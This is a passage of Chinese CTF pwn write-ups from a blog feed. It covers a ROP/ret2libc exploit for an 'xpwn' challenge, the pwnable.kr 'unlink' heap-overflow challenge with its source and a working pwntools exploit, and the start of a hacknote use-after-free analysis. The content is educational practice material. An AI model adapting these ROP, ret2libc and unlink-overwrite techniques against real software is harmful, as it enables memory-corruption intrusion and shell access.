class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">' '</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line">offset=<span class="number">0x65465</span></span><br><span class="line">s=remote(<span class="string">"116.85.48.105"</span>,<span class="number">5005</span>)</span><br><span class="line">s.sendlineafter(<span class="string">"Enter username:"</span>,<span class="string">'a'</span>*<span class="number">39</span>)</span><br><span class="line"></span><br><span class="line">bin_offset=<span class="number">0x15902b</span></span><br><span class="line">eax_offset=<span class="number">0x00023f97</span></span><br><span class="line">ebx_edx_offset=<span class="number">0xf1cba</span></span><br><span class="line">ecx_offset=<span class="number">0xb4047</span></span><br><span class="line">int80_offset=<span class="number">0x00002c87</span></span><br><span class="line"></span><br><span class="line">a=s.recvuntil(<span class="string">"He"</span>)</span><br><span class="line">b=s.recv(<span class="number">64</span>)</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-12</span>:<span class="number">-8</span>]))</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-8</span>:<span class="number">-4</span>]))</span><br><span class="line"></span><br><span class="line">base_addr=u32(b[<span class="number">-8</span>:<span class="number">-4</span>])-offset</span><br><span class="line">ropchain_addr=u32(b[<span class="number">-12</span>:<span class="number">-8</span>])</span><br><span class="line">bin_addr=base_addr+bin_offset</span><br><span class="line">eax_addr=base_addr+eax_offset</span><br><span class="line">ebx_edx_addr=base_addr+ebx_edx_offset</span><br><span class="line">ecx_addr=base_addr+ecx_offset</span><br><span class="line">int80_addr=base_addr+int80_offset</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"Please set the length of password:"</span>,<span class="string">"-10"</span>)</span><br><span class="line">s.sendlineafter(<span class="string">":"</span>,<span class="string">'a'</span>*<span class="number">68</span>+p32(ropchain_addr+<span class="number">4</span>)+<span class="string">'a'</span>*<span class="number">4</span>+p32(eax_addr)+p32(<span class="number">0xb</span>)+p32(ebx_edx_addr)+p32(bin_addr)+p32(<span class="number">0</span>)+p32(ecx_addr)+p32(<span class="number">0</span>)+p32(int80_addr))</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure><p>后来觉得rop链太长了，ret2libc也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">' '</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">offset=<span class="number">453205</span></span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#local</span></span><br><span class="line">s=process(<span class="string">"./xpwn"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line">s.sendlineafter(<span class="string">"Enter username:"</span>,<span class="string">'a'</span>*<span class="number">39</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#local-rop</span></span><br><span class="line">system_offset=<span class="number">0x3d870</span></span><br><span class="line">bin_offset=<span class="number">0x0017c968</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">eax_offset=0x000255c7</span></span><br><span class="line"><span class="string">ebx_offset=0x00019705</span></span><br><span class="line"><span class="string">ecx_edx_offset=0x0002de3b</span></span><br><span class="line"><span class="string">int80_offset=0x0002e185</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">a=s.recvuntil(<span class="string">"He"</span>)</span><br><span class="line">b=s.recv(<span class="number">64</span>)</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-12</span>:<span class="number">-8</span>]))</span><br><span class="line"><span class="keyword">print</span> hex(u32(b[<span class="number">-8</span>:<span class="number">-4</span>]))</span><br><span class="line">base_addr=u32(b[<span class="number">-8</span>:<span class="number">-4</span>])-offset</span><br><span class="line">ropchain_addr=u32(b[<span class="number">-12</span>:<span class="number">-8</span>])</span><br><span class="line">bin_addr=base_addr+bin_offset</span><br><span class="line">system_addr=base_addr+system_offset</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">68</span>+p32(ropchain_addr+<span class="number">4</span>)+<span class="string">'a'</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xb</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"Please set the length of password:"</span>,<span class="string">"-1"</span>)</span><br><span class="line">s.sendlineafter(<span class="string">":"</span>,payload)</span><br><span class="line"></span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure><p>感冒10天好了之后现在开始潜心修炼安卓和密码学</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-4-6-pwnable.kr-unlink</title>
      <link href="/passages/2019-4-6-pwnable.kr-unlink/"/>
      <url>/passages/2019-4-6-pwnable.kr-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="2019-4-6-pwnable-kr-unlink"><a href="#2019-4-6-pwnable-kr-unlink" class="headerlink" title="2019-4-6-pwnable.kr-unlink"></a>2019-4-6-pwnable.kr-unlink</h1><p>这一题第一眼看过去以为很简单，结果因为对指针的不熟悉导致卡壳了好久。<br>先用<br>scp -P 2222 <a href="mailto:unlink@pwnable.kr" target="_blank" rel="noopener">unlink@pwnable.kr</a>:/home/unlink/unlink 本地目录地址<br>把unlink和unlink.c下载下来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span><span class="comment">//4 byte</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span><span class="comment">//4 byte</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];<span class="comment">//8 byte</span></span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">OBJ* BK;<span class="comment">//4 byte</span></span><br><span class="line">OBJ* FD;<span class="comment">//4 byte</span></span><br><span class="line">BK=P-&gt;bk;<span class="comment">//4 byte</span></span><br><span class="line">FD=P-&gt;fd;<span class="comment">//4 byte</span></span><br><span class="line">FD-&gt;bk=BK;<span class="comment">//4 byte fd+4=bk</span></span><br><span class="line">BK-&gt;fd=FD;<span class="comment">//4 byte bk=fd</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line"><span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">A-&gt;fd = B;</span><br><span class="line">B-&gt;bk = A;</span><br><span class="line">B-&gt;fd = C;</span><br><span class="line">C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</span><br><span class="line"><span class="comment">// heap overflow!</span></span><br><span class="line">gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit this unlink!</span></span><br><span class="line">unlink(B);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序很简单，就是malloc了三个结构体，</p><p>在堆上的抽象结构<br>chunk A size<br>chunk A context（0-3字节存储<em>chunk B，4-7字节为空，+8字节buf）<br>chunk B size<br>chunk B context（头8个字节分别存储着 *chunk A、 *chunk B，+8字节buf）<br>chunk C size<br>chunk C context（第4-8字节存储着</em>chunk B，+8字节buf）</p><p>实际结构<br><img src="/images/2019-4-6-pwnable-unlink/2019-4-6-16-29.png" alt="avatar"><br>这里有个小问题，可能因为我的kali是64位的，所以在本地的堆是按16位对齐的，而pwnable.kr服务器的堆则是按照8位对齐的，这一点我也是多次失败看别人的题解才发现的，具体原理不懂。</p><p>然后unlink（B），简单来讲就是，让A原本为空的第4-8字节变成C，C原本为空的头四个字节变成A，是一个简化版的模拟unlink<br>B-&gt;fd-&gt;bk=B-&gt;bk<br>B-&gt;bk-&gt;fd=B-&gt;fd</p><p>原本光这样是没什么漏洞的，但因为unlink之前有个gets（A-&gt;buf），gets这个函数的危险性就在于它不会检测边界，可以随意地溢出。<br>通过溢出覆盖B的fd和bk，就可以造成任意地址写入。</p><p>我一开始的想法是让chunk B的fd=shell()函数地址，bk=main函数返回地址，然后发现了一个问题，就是*fd+4位置会被写入bk的值，这样shell函数就被破坏了。</p><p>然后我想到先把shell地址存起来，通过调用这个存放地址来调用shell函数，于是我写了这个payload：’a’*24+p32(heap+0x28)+p32(stack+0x18)+p32(shell_addr)，其中heap、stack是程序自己告诉我们的两个值，heap+0x28是chunkB的buf字段，stack+0x18是存放return地址。</p><p>这里就体现了我对指针的不熟悉，BK=stack+0x18，然后BK-&gt;fd=FD，这个时候return地址就变成了heap+0x28，然而heap+0x28不是shell的地址，而是存储着shell的地址，因为对指针的不熟悉导致我在这里卡了很久<br>用objdump -D unlink看汇编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call    unlink</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>忍不住看了别人的题解才发现函数返回之前，esp的值会变成[ecx-4]，而[heap+0x28]就是shell()函数地址。retn相当于pop eip，执行retn的时候就会把栈顶的esp赋值给eip，然后实现跳转。<br>所以我们要让ecx-4=shell_addr=heap+0x28，因为ecx=[ebp+var_4]=[ebp-4] (var_4=-4),所以要让ebp-4地址所在的值变成（heap+0x28）+4.<br>这样我们就能构造payload=’a’<em>24+p32(heap+0x28+4)+p32(stack+0x14-4)+p32(shell_addr)或者’a’</em>24+p32(stack+0x14-8)+p32(heap+0x28+4)+p32(shell_addr)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./unlink")</span></span><br><span class="line">p=ssh(user=<span class="string">'unlink'</span>,host=<span class="string">'pwnable.kr'</span>,port=<span class="number">2222</span>,password=<span class="string">'guest'</span>,)</span><br><span class="line"></span><br><span class="line">unlink_addr=<span class="number">0x08048504</span></span><br><span class="line">shell_addr=<span class="number">0x080484eb</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">text=p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> (text)</span><br><span class="line">stack=int(text[<span class="number">28</span>:<span class="number">38</span>],<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"stack:"</span>,stack)</span><br><span class="line">heap=int(text[<span class="number">-46</span>:<span class="number">-37</span>],<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"heap:"</span>,heap)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline('a'*24+p32(stack+12)+p32(heap+0x28+4)+p32(shell_addr))</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">16</span>+p32(stack+<span class="number">12</span>)+p32(heap+<span class="number">0x20</span>+<span class="number">4</span>)+p32(shell_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>心得体会：还是看汇编靠谱<br>参考题解：<a href="https://www.cnblogs.com/p4nda/p/7172104.html" target="_blank" rel="noopener">https://www.cnblogs.com/p4nda/p/7172104.html</a></p><p>Linux堆溢出漏洞利用之unlink：<br><a href="https://www.cnblogs.com/alisecurity/p/5563819.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisecurity/p/5563819.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-4-2-hacknote题解</title>
      <link href="/passages/2019-4-2-hacknote%E9%A2%98%E8%A7%A3/"/>
      <url>/passages/2019-4-2-hacknote%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="pwnabletw-hacknote"><a href="#pwnabletw-hacknote" class="headerlink" title="pwnabletw-hacknote"></a>pwnabletw-hacknote</h1><p>借着这道比较基础的uaf（use after free）的题目回顾一下堆溢出<br>先简单说说一下堆<br>堆基础</p><hr><p>可以通过gdb的vmmap查看内存空间<br><img src="/images/2019-4-2-hacknote/2019-4-2-20-53.png" alt="avatar"><br>其中[heap]就是堆空间，堆跟栈不同，堆是沿着地址高位增长的</p><p>堆分配的基本策略就是malloc(size)时系统分配堆大小的必定是比size大或等于的8\16的倍数（32位系统为8的倍数，在64位系统则是16的倍数），并且会有一个8字节的堆头（header），里面记录的堆的信息。（之后会在堆专门的学习笔记里详细展开）<br>（目前在我的学习中，只有malloc及其相似的一类函数会分配堆。）<br>所以在32位系统中，最低能分配的就是16字节的堆块（malloc（0）会返回NULL值，或者实际地址，具体取决于系统）</p><h2 id="uaf基础"><a href="#uaf基础" class="headerlink" title="uaf基础"></a>uaf基础</h2><p>当free堆块时，若是没有将堆块指针置NULL的话，那么就可以通过这个指针重新访问堆块，这时候堆块的内容可能为空，也可能是某个地址，最终导致漏洞出现。利用漏洞的方式就在于操作系统的堆管理方式，当一个堆块free后，并不是还给操作系统，而是放入表(bin)中，linux的堆管理存在着127个bin，不同bin的区别主要在于每个bin链表中存放的堆块（chunk）大小不同，像这道hacknote我们就只需要存放16-80字节的fastbin，当我们再次申请堆块空间时，系统就首先会从这些bin中找到最合适大小的堆块空间给我们。这种机制配合uaf再配合对堆内容的写入就能实现任意地址跳转了。</p><h2 id="hacknote函数解析"><a href="#hacknote函数解析" class="headerlink" title="hacknote函数解析"></a>hacknote函数解析</h2><p><img src="/images/2019-4-2-hacknote/2019-4-2-21-12.png" alt="avatar"><br>这次专注于基础的堆溢出，有用的信息就是该程序是16位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);<span class="comment">//开启CANARY后会在每个函数多出这个，从汇编上可以看出是在栈低，也就是ebp上方填入一个数字，跟本题无关</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_8048956();</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = atoi(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_80487D4();<span class="comment">//delete函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_80488A5();<span class="comment">//print函数</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      sub_8048646();<span class="comment">//add函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>main函数挺简单的，重点就三个函数，delete、print、add，其中uaf漏洞就存在于delete中，接下来我们看delete函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">v1 = atoi(&amp;buf);</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);<span class="comment">//重点在这，free后没有把指针置null，导致堆块虽然清空了，但是指针还保存着堆栈的地址，从而能访问空的堆栈，另外值得注意的是先free掉ptr[v1]+1指向的地址（字符串context），然后再free ptr[v1]</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure><p>知道漏洞是uaf后就要开始考虑怎么利用了,先看看add函数是怎么申请空间的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="keyword">if</span> ( dword_804A04C &lt;= <span class="number">5</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);<span class="comment">//首先申请一个8字节的空间，实际上会分配16字节</span></span><br><span class="line">      <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)ptr[i] = sub_804862B;<span class="comment">//这里是让刚才申请的堆块头部放入指向sub_804862B的指针，这样访问该堆块的时候就会执行这个函数，这个函数的作用就是put，并且参数是堆块本身，之后会用于地址泄露</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">      size = atoi(&amp;buf);</span><br><span class="line">      v0 = ptr[i];</span><br><span class="line">      v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);<span class="comment">//第二次申请堆空间，第一次申请的空间ptr[i]就是v0[0]，第二次申请的空间的指针就会存放到v0[1]中，这样put函数就能输出第二次申请的空间内储存的值了</span></span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)ptr[i] + <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">      read(<span class="number">0</span>, *((<span class="keyword">void</span> **)ptr[i] + <span class="number">1</span>), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">      ++dword_804A04C;</span><br><span class="line">      <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br></pre></td></tr></table></figure><p>这么分析可能还不够直白，上手操作一下<br><img src="/images/2019-4-2-hacknote/2019-4-2-21-44.png" alt="avatar"><br>这是我们要申请的堆块</p><p><img src="/images/2019-4-2-hacknote/2019-4-2-21-47.png" alt="avatar"><br>可以看到在堆块的起始位置0x0804b000偏移0xc的位置有个0x151的偏移，那就是存储着内容的堆的起始地点（为什么和实际index：0的堆块差了15个字节以后再讲），可以看到0x804b160就存储着我们刚申请的堆块，其中0x0804862b就是指向put函数的地址，0x0804b170就是字符串“aaaaaaaaaaaaaaa”的位置，之后会作为put函数的参数。</p><p>让我们来看一下print函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">v1 = atoi(&amp;buf);</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">  (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1])(ptr[v1]);<span class="comment">//ptr[v1]就是堆块地址，堆块头存储着put函数的地址，put函数的参数就是ptr[v1]，也就是它本身。</span></span><br><span class="line"><span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure><p>再看看puts函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br></pre></td></tr></table></figure><p>可以看到put会输出a1+4，也就是ptr[v1]+4，那个位置存储着字符串的地址</p><h2 id="hacknote题解"><a href="#hacknote题解" class="headerlink" 